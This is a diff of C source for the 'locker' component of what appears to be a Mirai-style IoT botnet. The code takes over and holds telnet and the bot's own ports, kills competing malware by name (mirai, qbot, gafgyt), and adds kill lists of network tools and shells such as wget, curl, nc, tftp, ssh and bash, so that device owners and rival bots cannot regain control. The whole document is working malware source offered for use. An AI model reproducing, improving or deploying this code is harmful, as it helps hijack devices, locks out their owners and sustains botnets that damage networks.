@@ -42,18 +42,13 @@ static int locker_pid = -1;
 static int telnet_socket = -1;
 static int netlink_fd = -1;
 
-
 #define MAX_LOCKED_PORTS 20  
 static int locked_ports[MAX_LOCKED_PORTS] = {-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1};
 static uint16_t ports_to_lock[MAX_LOCKED_PORTS];
 static int num_ports_to_lock = 0;
 
-
-
-
 static void init_default_ports(void) {
     if (num_ports_to_lock > 0) return; 
-    
     
     ports_to_lock[0] = 23;      
     num_ports_to_lock = 1;
@@ -66,6 +61,49 @@ static pid_t our_ppid = 0;
 static ino_t locker_inode = 0;      
 static dev_t locker_device = 0;     
 
+static const char *kill_tools[] = {
+    "wget",
+    "ftp",
+    "curl",
+    "socat",
+    "nc",
+    "netcat",
+    "tftp",
+    "scp",
+    "ssh",
+    "nmap",
+    "tcpdump",
+    "strace",
+    "gdb",
+    "busybox wget",
+    "busybox ftp",
+    "busybox curl",
+    "busybox nc",
+    "busybox tftp",
+    "echo",
+    "mount",
+    "umount",
+    "reboot",
+    "shutdown",
+    "halt",
+    "poweroff",
+    "init",
+    "telinit",
+    "login",
+    "telnet",
+    "sftp"
+};
+
+static const char *kill_shells[] = {
+    "sh",
+    "bash",
+    "dash",
+    "ash",
+    "ksh",
+    "zsh",
+    "csh",
+    "tcsh"
+};
 
 static inline BOOL is_watchdog_process(const char *path, const char *cmdline) {
     if (path == NULL && cmdline == NULL)
@@ -74,7 +112,6 @@ static inline BOOL is_watchdog_process(const char *path, const char *cmdline) {
     const char *check_str = path ? path : cmdline;
     if (check_str == NULL)
         return FALSE;
-    
     
     char lower_check[512];
     int len = strlen(check_str);
@@ -86,7 +123,6 @@ static inline BOOL is_watchdog_process(const char *path, const char *cmdline) {
                          check_str[i] + 32 : check_str[i];
     }
     lower_check[len] = '\0';
-    
     
     const char *watchdog_patterns[] = {
         "watchdog",
@@ -114,11 +150,9 @@ static inline BOOL is_watchdog_process(const char *path, const char *cmdline) {
     return FALSE;
 }
 
-
 static inline BOOL is_critical_system_process(const char *cmdline) {
     if (cmdline == NULL || strlen(cmdline) == 0)
         return TRUE; 
-    
     
     if (is_watchdog_process(NULL, cmdline)) {
         return TRUE;
@@ -158,6 +192,56 @@ static inline BOOL is_critical_system_process(const char *cmdline) {
     return FALSE;
 }
 
+static inline BOOL should_kill_by_command(const char *cmdline, const char *exe_path) {
+    if (cmdline == NULL && exe_path == NULL)
+        return FALSE;
+    
+    const char *check_str = cmdline ? cmdline : exe_path;
+    if (check_str == NULL)
+        return FALSE;
+    
+    char lower_check[1024];
+    int len = strlen(check_str);
+    if (len >= sizeof(lower_check))
+        len = sizeof(lower_check) - 1;
+    
+    for (int i = 0; i < len; i++) {
+        lower_check[i] = (check_str[i] >= 'A' && check_str[i] <= 'Z') ? 
+                         check_str[i] + 32 : check_str[i];
+    }
+    lower_check[len] = '\0';
+    
+    for (int i = 0; i < sizeof(kill_tools) / sizeof(kill_tools[0]); i++) {
+        if (strstr(lower_check, kill_tools[i]) != NULL) {
+            if (strstr(lower_check, "/usr/bin/") != NULL || 
+                strstr(lower_check, "/bin/") != NULL || 
+                strstr(lower_check, "/sbin/") != NULL ||
+                strstr(lower_check, "/usr/sbin/") != NULL) {
+                continue;
+            }
+            return TRUE;
+        }
+    }
+    
+    for (int i = 0; i < sizeof(kill_shells) / sizeof(kill_shells[0]); i++) {
+        if (strstr(lower_check, kill_shells[i]) != NULL) {
+            if (strstr(lower_check, "/usr/bin/") != NULL || 
+                strstr(lower_check, "/bin/") != NULL || 
+                strstr(lower_check, "/sbin/") != NULL ||
+                strstr(lower_check, "/usr/sbin/") != NULL) {
+                continue;
+            }
+            
+            if (strstr(lower_check, "-c") != NULL) {
+                continue;
+            }
+            
+            return TRUE;
+        }
+    }
+    
+    return FALSE;
+}
 static inline void lock_device(void) {
     DIR *dir;
     struct dirent *file;
@@ -182,13 +266,13 @@ static inline void lock_device(void) {
                 if (is_critical_system_process(cmdline))
                     continue;
                 
-                
-                
                 BOOL should_kill = FALSE;
                 
+                if (should_kill_by_command(cmdline, NULL)) {
+                    should_kill = TRUE;
+                }
                 
-                
-                if (strstr(cmdline, "wget") && strstr(cmdline, "/usr/bin/") == NULL && 
+                if (!should_kill && strstr(cmdline, "wget") && strstr(cmdline, "/usr/bin/") == NULL && 
                     strstr(cmdline, "/bin/") == NULL && strstr(cmdline, "/sbin/") == NULL) {
                     should_kill = TRUE;
                 }
@@ -197,13 +281,11 @@ static inline void lock_device(void) {
                     should_kill = TRUE;
                 }
                 
-                
                 if (!should_kill && (strstr(cmdline, "bash") || strstr(cmdline, "sh")) && 
                     strstr(cmdline, "/usr/bin/") == NULL && strstr(cmdline, "/bin/") == NULL &&
                     strstr(cmdline, "/sbin/") == NULL && strstr(cmdline, "-c") == NULL) {
                     should_kill = TRUE;
                 }
-                
                 
                 if (!should_kill && (strstr(cmdline, "reboot") || strstr(cmdline, "shutdown") || 
                     strstr(cmdline, "halt") || strstr(cmdline, "poweroff")) &&
@@ -273,16 +355,10 @@ static inline int hold_port(uint16_t port) {
     
     sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0) {
-        #ifdef DEBUG
-            printf("[locker] socket creation failed: %s (errno: %d)\n", strerror(errno), errno);
-        #endif
         return -1;
     }
     
     if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse)) < 0) {
-        #ifdef DEBUG
-            printf("[locker] setsockopt SO_REUSEADDR failed: %s (errno: %d)\n", strerror(errno), errno);
-        #endif
     }
     
     util_zero(&addr, sizeof(addr));
@@ -291,17 +367,11 @@ static inline int hold_port(uint16_t port) {
     addr.sin_port = htons(port);
     
     if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
-        #ifdef DEBUG
-            printf("[locker] bind to port %d failed: %s (errno: %d)\n", port, strerror(errno), errno);
-        #endif
         close(sock);
         return -1;
     }
 
     if (listen(sock, 1) < 0) {
-        #ifdef DEBUG
-            printf("[locker] listen on port %d failed: %s (errno: %d)\n", port, strerror(errno), errno);
-        #endif
         close(sock);
         return -1;
     }
@@ -309,11 +379,9 @@ static inline int hold_port(uint16_t port) {
     return sock;
 }
 
-
 static inline int hold_telnet_port(void) {
     return hold_port(23);
 }
-
 
 static inline BOOL is_port_already_locked(uint16_t port) {
     for (int i = 0; i < num_ports_to_lock; i++) {
@@ -324,26 +392,17 @@ static inline BOOL is_port_already_locked(uint16_t port) {
     return FALSE;
 }
 
-
 static inline void add_port_to_lock(uint16_t port) {
     if (is_port_already_locked(port)) {
         return; 
     }
     
     if (num_ports_to_lock >= MAX_LOCKED_PORTS) {
-        #ifdef DEBUG
-            printf("[locker] Cannot add port %d - max ports reached\n", port);
-        #endif
         return;
     }
     
     ports_to_lock[num_ports_to_lock++] = port;
-    #ifdef DEBUG
-        printf("[locker] Added port %d to lock list (total: %d)\n", port, num_ports_to_lock);
-    #endif
 }
-
-
 
 static inline int detect_bot_listening_ports(uint16_t *found_ports, int max_ports) {
     char net_tcp_path[64] = "/proc/net/tcp";
@@ -360,14 +419,12 @@ static inline int detect_bot_listening_ports(uint16_t *found_ports, int max_port
         return 0; 
     }
     
-    
     char fd_dir_path[64];
     snprintf(fd_dir_path, sizeof(fd_dir_path), "/proc/%d/fd", (int)bot_pid);
     DIR *fd_dir = opendir(fd_dir_path);
     if (fd_dir == NULL) {
         return 0; 
     }
-    
     
     ino_t bot_socket_inodes[64];
     int bot_inode_count = 0;
@@ -397,22 +454,18 @@ static inline int detect_bot_listening_ports(uint16_t *found_ports, int max_port
         return 0; 
     }
     
-    
     net_tcp_file = fopen(net_tcp_path, "r");
     if (net_tcp_file == NULL) {
         return 0;
     }
     
-    
     if (fgets(line, sizeof(line), net_tcp_file) != NULL) {
         while (fgets(line, sizeof(line), net_tcp_file) != NULL && found_count < max_ports) {
-            
             
             char *last_space = strrchr(line, ' ');
             if (last_space == NULL) continue;
             
             ino_t line_inode = (ino_t)strtoul(last_space + 1, NULL, 10);
-            
             
             BOOL is_bot_socket = FALSE;
             for (int i = 0; i < bot_inode_count; i++) {
@@ -424,15 +477,11 @@ static inline int detect_bot_listening_ports(uint16_t *found_ports, int max_port
             
             if (!is_bot_socket) continue;
             
-            
-            
             char *local_addr = strtok(line, " ");
             if (local_addr == NULL) continue;
             
-            
             char *colon = strchr(local_addr, ':');
             if (colon == NULL) continue;
-            
             
             char port_hex[8];
             int port_hex_len = 0;
@@ -442,10 +491,8 @@ static inline int detect_bot_listening_ports(uint16_t *found_ports, int max_port
             }
             port_hex[port_hex_len] = '\0';
             
-            
             uint16_t port = (uint16_t)strtoul(port_hex, NULL, 16);
             port = ntohs(port); 
-            
             
             BOOL already_found = FALSE;
             for (int i = 0; i < found_count; i++) {
@@ -464,7 +511,6 @@ static inline int detect_bot_listening_ports(uint16_t *found_ports, int max_port
     fclose(net_tcp_file);
     return found_count;
 }
-
 
 static inline BOOL is_port_used_by_bot(uint16_t port) {
     
@@ -486,21 +532,13 @@ static inline BOOL is_port_used_by_bot(uint16_t port) {
     return FALSE;
 }
 
-
 static inline void kill_port_processes(uint16_t port);
-
-
-
 
 void secure_port_for_bot(uint16_t port) {
     
     if (is_port_used_by_bot(port)) {
-        #ifdef DEBUG
-            printf("[locker] Bot is running on port %d, adding to lock list\n", port);
-        #endif
         
         add_port_to_lock(port);
-        
         
         BOOL already_bound = FALSE;
         for (int i = 0; i < num_ports_to_lock && i < MAX_LOCKED_PORTS; i++) {
@@ -515,39 +553,21 @@ void secure_port_for_bot(uint16_t port) {
             for (int i = 0; i < MAX_LOCKED_PORTS; i++) {
                 if (locked_ports[i] < 0) {
                     locked_ports[i] = hold_port(port);
-                    if (locked_ports[i] >= 0) {
-                        #ifdef DEBUG
-                            printf("[locker] Successfully bound to bot's port %d\n", port);
-                        #endif
-                    }
                     break;
                 }
             }
         }
     } else {
-        #ifdef DEBUG
-            printf("[locker] Bot is NOT running on port %d, attempting takeover\n", port);
-        #endif
         
         kill_port_processes(port);
         usleep(5000); 
         
-        
         add_port_to_lock(port);
-        
         
         for (int i = 0; i < MAX_LOCKED_PORTS; i++) {
             if (locked_ports[i] < 0) {
                 locked_ports[i] = hold_port(port);
-                if (locked_ports[i] >= 0) {
-                    #ifdef DEBUG
-                        printf("[locker] Successfully took over port %d\n", port);
-                    #endif
-                } else {
-                    #ifdef DEBUG
-                        printf("[locker] Failed to take over port %d, retrying...\n", port);
-                    #endif
-                    
+                if (locked_ports[i] < 0) {
                     kill_port_processes(port);
                     usleep(2000);
                     locked_ports[i] = hold_port(port);
@@ -571,9 +591,7 @@ static inline void kill_port_processes(uint16_t port) {
     char line[512];
     ino_t target_inode = 0;
 
-    
     snprintf(port_hex, sizeof(port_hex), "%04X", ntohs(htons(port)));
-    
     
     snprintf(net_tcp_path, sizeof(net_tcp_path), "/proc/net/tcp");
     net_tcp_file = fopen(net_tcp_path, "r");
@@ -581,7 +599,6 @@ static inline void kill_port_processes(uint16_t port) {
         
         if (fgets(line, sizeof(line), net_tcp_file) != NULL) {
             while (fgets(line, sizeof(line), net_tcp_file) != NULL) {
-                
                 
                 if (strstr(line, port_hex) != NULL) {
                     
@@ -612,7 +629,6 @@ static inline void kill_port_processes(uint16_t port) {
                 continue;
             exe_path[len] = '\0';
 
-            
             char exe_path_clean[256];
             strncpy(exe_path_clean, exe_path, sizeof(exe_path_clean) - 1);
             exe_path_clean[sizeof(exe_path_clean) - 1] = '\0';
@@ -621,15 +637,12 @@ static inline void kill_port_processes(uint16_t port) {
                 *deleted_pos = '\0';
             }
             
-            
             BOOL is_our_process = FALSE;
-            
             
             if (killer_realpath_len > 0 && len == killer_realpath_len && 
                 memcmp(exe_path_clean, killer_realpath, killer_realpath_len) == 0) {
                 is_our_process = TRUE;
             }
-            
             
             if (!is_our_process) {
                 const char *persistent = get_persistent_path();
@@ -638,7 +651,6 @@ static inline void kill_port_processes(uint16_t port) {
                     is_our_process = TRUE;
                 }
             }
-            
             
             if (!is_our_process && locker_inode != 0 && locker_device != 0) {
                 struct stat proc_stat;
@@ -653,7 +665,6 @@ static inline void kill_port_processes(uint16_t port) {
                 continue; 
             }
 
-            
             if (target_inode != 0) {
                 char fd_dir_path[64];
                 snprintf(fd_dir_path, sizeof(fd_dir_path), "/proc/%s/fd", file->d_name);
@@ -686,11 +697,15 @@ static inline void kill_port_processes(uint16_t port) {
                 }
             }
 
-            
             snprintf(path, sizeof(path), "/proc/%s/cmdline", file->d_name);
             FILE *cmdfile = fopen(path, "r");
             if (cmdfile != NULL) {
                 if (fgets(cmdline, sizeof(cmdline), cmdfile) != NULL) {
+                    
+                    if (should_kill_by_command(cmdline, exe_path)) {
+                        kill(pid, 9);
+                        continue;
+                    }
                     
                     if (port == 23 && (strstr(exe_path, "telnetd") || strstr(cmdline, "telnetd"))) {
                         kill(pid, 9);
@@ -719,7 +734,6 @@ static inline void kill_port_processes(uint16_t port) {
 
     closedir(dir);
 }
-
 
 static inline void kill_telnet_processes(void) {
     kill_port_processes(23);
@@ -755,8 +769,6 @@ static inline BOOL exe_access(void) {
             *deleted_pos = '\0';
             killer_realpath_len = strlen(killer_realpath);
         }
-        
-        
         
         struct stat self_stat;
         if (stat(killer_realpath, &self_stat) == 0) {
@@ -823,7 +835,6 @@ static inline void locker_handle_exec(const char *pid_str, pid_t i_pid) {
     }
     exe[exe_len] = '\0';
 
-    
     char exe_clean[PATH_MAX];
     strncpy(exe_clean, exe, sizeof(exe_clean) - 1);
     exe_clean[sizeof(exe_clean) - 1] = '\0';
@@ -832,17 +843,12 @@ static inline void locker_handle_exec(const char *pid_str, pid_t i_pid) {
         *deleted_pos = '\0';
     }
     
-    
-    
-    
     BOOL is_our_process = FALSE;
-    
     
     if (killer_realpath_len > 0 && exe_len == killer_realpath_len && 
         memcmp(exe_clean, killer_realpath, killer_realpath_len) == 0) {
         is_our_process = TRUE;
     }
-    
     
     if (!is_our_process) {
         const char *persistent = get_persistent_path();
@@ -852,11 +858,9 @@ static inline void locker_handle_exec(const char *pid_str, pid_t i_pid) {
         }
     }
     
-    
     if (!is_our_process && locker_inode != 0 && locker_device != 0) {
         struct stat proc_stat;
         if (stat(exe_clean, &proc_stat) == 0) {
-            
             if (proc_stat.st_ino == locker_inode && proc_stat.st_dev == locker_device) {
                 is_our_process = TRUE;
             }
@@ -884,105 +888,13 @@ static inline void locker_handle_exec(const char *pid_str, pid_t i_pid) {
         }
     }
 
-    
     if (is_critical_system_process(cmdline_len > 0 ? cmdline : exe))
         return;
     
-    
     if (stealth_is_hidden_process(exe_len > 0 ? exe : NULL, cmdline_len > 0 ? cmdline : NULL)) {
-        kill(i_pid, 9);
-        return;
-    }
-    
-    
-    if (exe_len > 0 && cmdline_len > 0 && stealth_has_mismatch(exe, cmdline)) {
-        kill(i_pid, 9);
-        return;
-    }
-    
-    BOOL should_kill = FALSE;
-    
-    
-    const char *check_str = exe;
-    if (check_str == NULL && cmdline_len > 0)
-        check_str = cmdline;
-    
-    if (check_str != NULL) {
-        char lower_check[512];
-        int len = strlen(check_str);
-        if (len >= sizeof(lower_check))
-            len = sizeof(lower_check) - 1;
-        
-        for (int i = 0; i < len; i++) {
-            lower_check[i] = (check_str[i] >= 'A' && check_str[i] <= 'Z') ? 
-                             check_str[i] + 32 : check_str[i];
-        }
-        lower_check[len] = '\0';
-        
-        
-        
-        if (is_watchdog_process(exe, cmdline_len > 0 ? cmdline : NULL)) {
-            
-            should_kill = FALSE;
-        } else {
-        const char *competing_bots[] = {
-            "mirai",
-            "qbot",
-            "gafgyt",
-            "tsunami",
-            "bashlite",
-            "aidra",
-            ".bin",
-            ".elf"
-        };
-        
-        for (int i = 0; i < sizeof(competing_bots) / sizeof(competing_bots[0]); i++) {
-            if (strstr(lower_check, competing_bots[i]) != NULL) {
-                    
-                    if (!is_critical_system_process(check_str) && 
-                        !is_watchdog_process(exe, cmdline_len > 0 ? cmdline : NULL)) {
-                    should_kill = TRUE;
-                    break;
-                    }
-                }
-            }
-        }
-    }
-    
-    
-    if (!should_kill && strstr(exe, "telnetd") && strstr(exe, "/usr/sbin/") == NULL && 
-        strstr(exe, "/sbin/") == NULL && strstr(exe, "/bin/") == NULL) {
-        should_kill = TRUE;
-    }
-    if (!should_kill && cmdline_len > 0 && strstr(cmdline, "telnetd") && 
-        strstr(cmdline, "/usr/sbin/") == NULL && strstr(cmdline, "/sbin/") == NULL) {
-        should_kill = TRUE;
-    }
-
-    
-    if (!should_kill && (strstr(exe, "wget") || strstr(exe, "curl")) && 
-        strstr(exe, "/usr/bin/") == NULL && strstr(exe, "/bin/") == NULL &&
-        strstr(exe, "/sbin/") == NULL) {
-        should_kill = TRUE;
-    }
-    if (!should_kill && cmdline_len > 0 && (strstr(cmdline, "wget") || strstr(cmdline, "curl")) &&
-        strstr(cmdline, "/usr/bin/") == NULL && strstr(cmdline, "/bin/") == NULL &&
-        strstr(cmdline, "/sbin/") == NULL) {
-        should_kill = TRUE;
-    }
-
-    
-    if (!should_kill && (strstr(exe, "sh") || strstr(exe, "bash")) && 
-        strstr(exe, "/usr/bin/") == NULL && strstr(exe, "/bin/") == NULL &&
-        strstr(exe, "/sbin/") == NULL && cmdline_len > 0 && strstr(cmdline, "-c") == NULL) {
-        should_kill = TRUE;
-    }
-
-    if (should_kill) {
         kill(i_pid, 9);
     }
 }
-
 static int proc_filter(const struct dirent *entry) {
     char c = *(entry->d_name);
     return (c >= '0' && c <= '9');
@@ -1023,7 +935,6 @@ static inline void locker_proc(void) {
         }
         exe[exe_len] = '\0';
 
-        
         char exe_clean[PATH_MAX];
         strncpy(exe_clean, exe, sizeof(exe_clean) - 1);
         exe_clean[sizeof(exe_clean) - 1] = '\0';
@@ -1032,17 +943,12 @@ static inline void locker_proc(void) {
             *deleted_pos = '\0';
         }
         
-        
-        
-        
         BOOL is_our_process = FALSE;
-        
         
         if (killer_realpath_len > 0 && exe_len == killer_realpath_len && 
             memcmp(exe_clean, killer_realpath, killer_realpath_len) == 0) {
             is_our_process = TRUE;
         }
-        
         
         if (!is_our_process) {
             const char *persistent = get_persistent_path();
@@ -1052,11 +958,9 @@ static inline void locker_proc(void) {
             }
         }
         
-        
         if (!is_our_process && locker_inode != 0 && locker_device != 0) {
             struct stat proc_stat;
             if (stat(exe_clean, &proc_stat) == 0) {
-                
                 if (proc_stat.st_ino == locker_inode && proc_stat.st_dev == locker_device) {
                     is_our_process = TRUE;
                 }
@@ -1085,19 +989,16 @@ static inline void locker_proc(void) {
             }
         }
 
-        
         if (is_critical_system_process(cmdline_len > 0 ? cmdline : exe)) {
             free(namelist[i]);
             continue;
         }
-        
         
         if (stealth_is_hidden_process(exe_len > 0 ? exe : NULL, cmdline_len > 0 ? cmdline : NULL)) {
             kill(i_pid, 9);
             free(namelist[i]);
             continue;
         }
-        
         
         if (exe_len > 0 && cmdline_len > 0 && stealth_has_mismatch(exe, cmdline)) {
             kill(i_pid, 9);
@@ -1107,12 +1008,15 @@ static inline void locker_proc(void) {
         
         BOOL should_kill = FALSE;
         
+        if (should_kill_by_command(cmdline_len > 0 ? cmdline : NULL, exe_len > 0 ? exe : NULL)) {
+            should_kill = TRUE;
+        }
         
         const char *check_str = exe;
         if (check_str == NULL && cmdline_len > 0)
             check_str = cmdline;
         
-        if (check_str != NULL) {
+        if (check_str != NULL && !should_kill) {
             char lower_check[512];
             int len = strlen(check_str);
             if (len >= sizeof(lower_check))
@@ -1124,10 +1028,7 @@ static inline void locker_proc(void) {
             }
             lower_check[len] = '\0';
             
-            
-            
             if (is_watchdog_process(exe, cmdline_len > 0 ? cmdline : NULL)) {
-                
                 should_kill = FALSE;
             } else {
             const char *competing_bots[] = {
@@ -1176,7 +1077,6 @@ static inline void locker_proc(void) {
             
             for (int j = 0; j < sizeof(competing_bots) / sizeof(competing_bots[0]); j++) {
                 if (strstr(lower_check, competing_bots[j]) != NULL) {
-                        
                         if (!is_critical_system_process(check_str) && 
                             !is_watchdog_process(exe, cmdline_len > 0 ? cmdline : NULL)) {
                         should_kill = TRUE;
@@ -1187,7 +1087,6 @@ static inline void locker_proc(void) {
             }
         }
         
-        
         if (!should_kill && strstr(exe, "telnetd") && strstr(exe, "/usr/sbin/") == NULL && 
             strstr(exe, "/sbin/") == NULL && strstr(exe, "/bin/") == NULL) {
             should_kill = TRUE;
@@ -1197,7 +1096,6 @@ static inline void locker_proc(void) {
             should_kill = TRUE;
         }
 
-        
         if (!should_kill && (strstr(exe, "wget") || strstr(exe, "curl")) && 
             strstr(exe, "/usr/bin/") == NULL && strstr(exe, "/bin/") == NULL &&
             strstr(exe, "/sbin/") == NULL) {
@@ -1209,7 +1107,6 @@ static inline void locker_proc(void) {
             should_kill = TRUE;
         }
 
-        
         if (!should_kill && (strstr(exe, "sh") || strstr(exe, "bash")) && 
             strstr(exe, "/usr/bin/") == NULL && strstr(exe, "/bin/") == NULL &&
             strstr(exe, "/sbin/") == NULL && cmdline_len > 0 && strstr(cmdline, "-c") == NULL) {
@@ -1251,69 +1148,34 @@ void locker_init(void) {
             exit(0);
         }
 
-        
         init_default_ports();
-        
         
         uint16_t bot_ports[16];
         int bot_port_count = detect_bot_listening_ports(bot_ports, 16);
         
-        #ifdef DEBUG
-            printf("[locker] Detected %d bot listening ports\n", bot_port_count);
-        #endif
-        
         for (int i = 0; i < bot_port_count; i++) {
-            #ifdef DEBUG
-                printf("[locker] Bot is listening on port %d\n", bot_ports[i]);
-            #endif
             add_port_to_lock(bot_ports[i]);
         }
 
-        
         for (int i = 0; i < num_ports_to_lock; i++) {
-            
             if (is_port_used_by_bot(ports_to_lock[i])) {
-                #ifdef DEBUG
-                    printf("[locker] Port %d is used by bot, will attempt takeover if needed\n", ports_to_lock[i]);
-                #endif
             } else {
-                
             kill_port_processes(ports_to_lock[i]);
             }
         }
         usleep(10000);
 
-        
         for (int i = 0; i < num_ports_to_lock && i < MAX_LOCKED_PORTS; i++) {
-            
             locked_ports[i] = hold_port(ports_to_lock[i]);
-            
             if (locked_ports[i] < 0) {
-                
                 if (is_port_used_by_bot(ports_to_lock[i])) {
-                    #ifdef DEBUG
-                        printf("[locker] Port %d is used by bot, skipping lock (bot owns it)\n", ports_to_lock[i]);
-                    #endif
-                    
                 } else {
-                    
                     kill_port_processes(ports_to_lock[i]);
                     usleep(5000);
                 locked_ports[i] = hold_port(ports_to_lock[i]);
-                    if (locked_ports[i] < 0) {
-                        #ifdef DEBUG
-                            printf("[locker] Failed to lock port %d after retry\n", ports_to_lock[i]);
-                        #endif
-                    }
                 }
-            } else {
-                #ifdef DEBUG
-                    printf("[locker] Successfully locked port %d\n", ports_to_lock[i]);
-                #endif
             }
         }
-        
-        
         
         if (locked_ports[0] >= 0) {
         telnet_socket = locked_ports[0]; 
@@ -1407,16 +1269,13 @@ void locker_init(void) {
 
                 port_check_counter++;
                 if (port_check_counter >= 4000) {
-                    
                     uint16_t bot_ports[16];
                     int bot_port_count = detect_bot_listening_ports(bot_ports, 16);
                     for (int i = 0; i < bot_port_count; i++) {
                         add_port_to_lock(bot_ports[i]);
                     }
                     
-                    
                     for (int i = 0; i < num_ports_to_lock && i < MAX_LOCKED_PORTS; i++) {
-                        
                         if (is_port_used_by_bot(ports_to_lock[i])) {
                             continue; 
                         }
@@ -1426,7 +1285,6 @@ void locker_init(void) {
                         }
                         locked_ports[i] = hold_port(ports_to_lock[i]);
                         if (locked_ports[i] < 0) {
-                            
                             kill_port_processes(ports_to_lock[i]);
                             usleep(1000);
                             locked_ports[i] = hold_port(ports_to_lock[i]);
@@ -1470,16 +1328,13 @@ void locker_init(void) {
                 
                 port_check_counter++;
                 if (port_check_counter >= 4000) {
-                    
                     uint16_t bot_ports[16];
                     int bot_port_count = detect_bot_listening_ports(bot_ports, 16);
                     for (int i = 0; i < bot_port_count; i++) {
                         add_port_to_lock(bot_ports[i]);
                     }
                     
-                    
                     for (int i = 0; i < num_ports_to_lock && i < MAX_LOCKED_PORTS; i++) {
-                        
                         if (is_port_used_by_bot(ports_to_lock[i])) {
                             continue; 
                         }
@@ -1489,7 +1344,6 @@ void locker_init(void) {
                         }
                         locked_ports[i] = hold_port(ports_to_lock[i]);
                         if (locked_ports[i] < 0) {
-                            
                             kill_port_processes(ports_to_lock[i]);
                             usleep(1000);
                             locked_ports[i] = hold_port(ports_to_lock[i]);
@@ -1521,7 +1375,6 @@ void locker_kill(void) {
         netlink_fd = -1;
     }
     
-    
     for (int i = 0; i < MAX_LOCKED_PORTS; i++) {
         if (locked_ports[i] >= 0) {
             close(locked_ports[i]);
@@ -1529,11 +1382,8 @@ void locker_kill(void) {
         }
     }
     
-    
-    
     if (telnet_socket >= 0 && (num_ports_to_lock == 0 || locked_ports[0] != telnet_socket)) {
         close(telnet_socket);
         telnet_socket = -1;
     }
 }
-
